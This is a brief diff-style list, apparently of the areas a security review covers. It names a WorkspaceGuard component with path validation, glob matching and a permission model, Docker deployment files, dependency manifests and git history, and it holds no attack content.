+- WorkspaceGuard (path validation, glob matching, permission model)
+- Docker deployment configuration (Dockerfile, docker-compose.yml)
 - Dependency manifests and configuration files
+- Git history for security-relevant changes
